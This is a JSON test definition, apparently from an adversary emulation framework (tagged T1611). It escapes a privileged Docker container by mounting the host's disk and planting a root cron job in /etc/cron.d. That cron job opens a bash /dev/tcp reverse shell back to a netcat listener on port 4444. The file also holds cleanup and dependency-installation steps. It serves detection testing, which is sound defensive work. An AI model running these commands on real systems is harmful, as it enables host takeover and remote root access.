{
  "id": "6c499943-b098-4bc6-8d38-0956fc182984",
  "name": "Mount host filesystem to escape privileged Docker container",
  "description": "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n",
  "platforms": [
    "containers"
  ],
  "steps": [
    {
      "id": "03e129f6-93ca-4fb0-8e49-65f346f80460",
      "type": "execute-command",
      "data": {
        "command": "if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" \u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"(hostname) \" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho \"(id)\\\" \u003e\u0026 /dev/tcp/#{listen_address}/#{listen_port} 0\u003e\u00261'\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\nnetcat -l -p #{listen_port} 2\u003e\u00261",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "913c1863-fd3b-4dd7-b218-5de7cfd919b6",
      "type": "execute-command",
      "data": {
        "command": "rm #{mount_point}#{cron_path}/#{cron_filename}\numount #{mount_point}\nrmdir #{mount_point}",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "36ab9cc9-c536-4507-a229-0d6b6878d491",
      "name": "Check dependency 1/5",
      "description": "Verify mount is installed.",
      "type": "execute-command",
      "data": {
        "command": "which mount",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "920de5b7-94c9-440a-a1c1-c2cc253213a6",
      "name": "Resolve dependency 1/5",
      "description": "Verify mount is installed.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which mount`\" ]; then echo \"mount Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install mount ; elif [ -n \"`which yum`\" ]; then sudo yum -y install mount ; fi ; else echo \"mount installed\"; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "53cc6517-99e5-431a-82b8-a63290b86709",
      "name": "Re-check dependency 1/5",
      "description": "Verify mount is installed.",
      "type": "execute-command",
      "data": {
        "command": "which mount",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "0c6c8d8a-c884-4f29-973d-0e8b73a18c4d",
      "name": "Check dependency 2/5",
      "description": "Verify container is privileged.",
      "type": "execute-command",
      "data": {
        "command": "capsh --print | grep cap_sys_admin",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "d7592c61-f180-46ed-a133-2ef5b3f0f1af",
      "name": "Resolve dependency 2/5",
      "description": "Verify container is privileged.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"`capsh --print | grep cap_sys_admin`\" == \"\" ]; then echo \"Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "d9c450ec-4626-4fab-ae20-cd854fb3b8ee",
      "name": "Re-check dependency 2/5",
      "description": "Verify container is privileged.",
      "type": "execute-command",
      "data": {
        "command": "capsh --print | grep cap_sys_admin",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "8fac4207-db66-4663-8257-76f34e119aac",
      "name": "Check dependency 3/5",
      "description": "Verify mount device (/dev/dm-0) exists.",
      "type": "execute-command",
      "data": {
        "command": "ls #{mount_device}",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "f69dfee1-9622-4e6e-8561-d38ec5b37f58",
      "name": "Resolve dependency 3/5",
      "description": "Verify mount device (/dev/dm-0) exists.",
      "type": "execute-command",
      "data": {
        "command": "if [ ! -f #{mount_device} ]; then echo \"Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "89d77089-eb19-4c8b-8603-e32ee03741ec",
      "name": "Re-check dependency 3/5",
      "description": "Verify mount device (/dev/dm-0) exists.",
      "type": "execute-command",
      "data": {
        "command": "ls #{mount_device}",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "25d92eff-3ccd-4e69-86ea-dd8de12fff21",
      "name": "Check dependency 4/5",
      "description": "Netcat is installed.",
      "type": "execute-command",
      "data": {
        "command": "which netcat",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "96ac3aeb-9237-464c-8363-309c47dc0336",
      "name": "Resolve dependency 4/5",
      "description": "Netcat is installed.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which netcat`\" ]; then echo \"netcat Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install netcat ; elif [ -n \"`which yum`\" ]; then sudo yum -y install netcat ; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "7a2e74e4-d4ec-482a-bff1-0c2be196ee51",
      "name": "Re-check dependency 4/5",
      "description": "Netcat is installed.",
      "type": "execute-command",
      "data": {
        "command": "which netcat",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "78ed1269-38a3-41f2-8e65-508fb962e188",
      "name": "Check dependency 5/5",
      "description": "IP Address is known.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "7e956fc8-4727-459f-bf99-44178406cf53",
      "name": "Resolve dependency 5/5",
      "description": "IP Address is known.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which ifconfig`\" ]; then echo \"ifconfig Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install net=tools ; elif [ -n \"`which yum`\" ]; then sudo yum -y install net-tools ; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "a6247b5f-73b4-485d-8021-c48624ffcfd4",
      "name": "Re-check dependency 5/5",
      "description": "IP Address is known.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "03e129f6-93ca-4fb0-8e49-65f346f80460",
      "p": "on-success",
      "o": "913c1863-fd3b-4dd7-b218-5de7cfd919b6"
    },
    {
      "s": "03e129f6-93ca-4fb0-8e49-65f346f80460",
      "p": "on-failure",
      "o": "913c1863-fd3b-4dd7-b218-5de7cfd919b6"
    },
    {
      "s": "36ab9cc9-c536-4507-a229-0d6b6878d491",
      "p": "on-success",
      "o": "03e129f6-93ca-4fb0-8e49-65f346f80460"
    },
    {
      "s": "36ab9cc9-c536-4507-a229-0d6b6878d491",
      "p": "on-failure",
      "o": "920de5b7-94c9-440a-a1c1-c2cc253213a6"
    },
    {
      "s": "920de5b7-94c9-440a-a1c1-c2cc253213a6",
      "p": "on-success",
      "o": "53cc6517-99e5-431a-82b8-a63290b86709"
    },
    {
      "s": "53cc6517-99e5-431a-82b8-a63290b86709",
      "p": "on-failure",
      "o": "03e129f6-93ca-4fb0-8e49-65f346f80460"
    },
    {
      "s": "0c6c8d8a-c884-4f29-973d-0e8b73a18c4d",
      "p": "on-success",
      "o": "03e129f6-93ca-4fb0-8e49-65f346f80460"
    },
    {
      "s": "0c6c8d8a-c884-4f29-973d-0e8b73a18c4d",
      "p": "on-failure",
      "o": "d7592c61-f180-46ed-a133-2ef5b3f0f1af"
    },
    {
      "s": "d7592c61-f180-46ed-a133-2ef5b3f0f1af",
      "p": "on-success",
      "o": "d9c450ec-4626-4fab-ae20-cd854fb3b8ee"
    },
    {
      "s": "d9c450ec-4626-4fab-ae20-cd854fb3b8ee",
      "p": "on-failure",
      "o": "03e129f6-93ca-4fb0-8e49-65f346f80460"
    },
    {
      "s": "8fac4207-db66-4663-8257-76f34e119aac",
      "p": "on-success",
      "o": "03e129f6-93ca-4fb0-8e49-65f346f80460"
    },
    {
      "s": "8fac4207-db66-4663-8257-76f34e119aac",
      "p": "on-failure",
      "o": "f69dfee1-9622-4e6e-8561-d38ec5b37f58"
    },
    {
      "s": "f69dfee1-9622-4e6e-8561-d38ec5b37f58",
      "p": "on-success",
      "o": "89d77089-eb19-4c8b-8603-e32ee03741ec"
    },
    {
      "s": "89d77089-eb19-4c8b-8603-e32ee03741ec",
      "p": "on-failure",
      "o": "03e129f6-93ca-4fb0-8e49-65f346f80460"
    },
    {
      "s": "25d92eff-3ccd-4e69-86ea-dd8de12fff21",
      "p": "on-success",
      "o": "03e129f6-93ca-4fb0-8e49-65f346f80460"
    },
    {
      "s": "25d92eff-3ccd-4e69-86ea-dd8de12fff21",
      "p": "on-failure",
      "o": "96ac3aeb-9237-464c-8363-309c47dc0336"
    },
    {
      "s": "96ac3aeb-9237-464c-8363-309c47dc0336",
      "p": "on-success",
      "o": "7a2e74e4-d4ec-482a-bff1-0c2be196ee51"
    },
    {
      "s": "7a2e74e4-d4ec-482a-bff1-0c2be196ee51",
      "p": "on-failure",
      "o": "03e129f6-93ca-4fb0-8e49-65f346f80460"
    },
    {
      "s": "78ed1269-38a3-41f2-8e65-508fb962e188",
      "p": "on-success",
      "o": "03e129f6-93ca-4fb0-8e49-65f346f80460"
    },
    {
      "s": "78ed1269-38a3-41f2-8e65-508fb962e188",
      "p": "on-failure",
      "o": "7e956fc8-4727-459f-bf99-44178406cf53"
    },
    {
      "s": "7e956fc8-4727-459f-bf99-44178406cf53",
      "p": "on-success",
      "o": "a6247b5f-73b4-485d-8021-c48624ffcfd4"
    },
    {
      "s": "a6247b5f-73b4-485d-8021-c48624ffcfd4",
      "p": "on-failure",
      "o": "03e129f6-93ca-4fb0-8e49-65f346f80460"
    }
  ],
  "tags": [
    "T1611"
  ],
  "input_arguments": [
    {
      "name": "listen_port",
      "type": "integer",
      "description": "TCP Port to listen on for callback from the host system.",
      "value": "4444"
    },
    {
      "name": "mount_device",
      "type": "path",
      "description": "Path to the device of the host's disk to mount",
      "value": "/dev/dm-0"
    },
    {
      "name": "mount_point",
      "type": "path",
      "description": "Path where the host filesystem will be mounted",
      "value": "/mnt/T1611.002"
    },
    {
      "name": "cron_path",
      "type": "path",
      "description": "Path on the host filesystem where cron jobs are stored",
      "value": "/etc/cron.d"
    },
    {
      "name": "cron_filename",
      "type": "string",
      "description": "Filename of the cron job in cron_path",
      "value": "T1611_002"
    },
    {
      "name": "listen_address",
      "type": "string",
      "description": "IP address to listen for callback from the host system.",
      "value": "`ifconfig eth0 | grep inet | awk '{print $2}'`"
    }
  ]
}